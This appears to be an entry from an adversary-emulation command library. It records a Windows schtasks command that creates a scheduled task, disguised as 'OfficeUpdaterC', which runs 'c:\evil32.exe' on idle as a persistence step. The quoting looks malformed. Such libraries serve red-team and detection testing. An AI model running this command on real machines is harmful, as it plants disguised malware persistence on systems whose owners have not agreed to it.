---
id: c6e3f550-50be-4c6d-a985-c80f7d6999e2
name: Schedule Task to run on Idle
type: command
executor: ''
data: schtasks /create /TN OfficeUpdaterC /tr ""c:\evil32.exe" -k password -n services"
  /SC onidle /i 30''''
output: null
created_at: '2020-07-15T21:22:25.606660+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Schedule Task to run on Idle

```bash
schtasks /create /TN OfficeUpdaterC /tr ""c:\evil32.exe" -k password -n services" /SC onidle /i 30''''
```
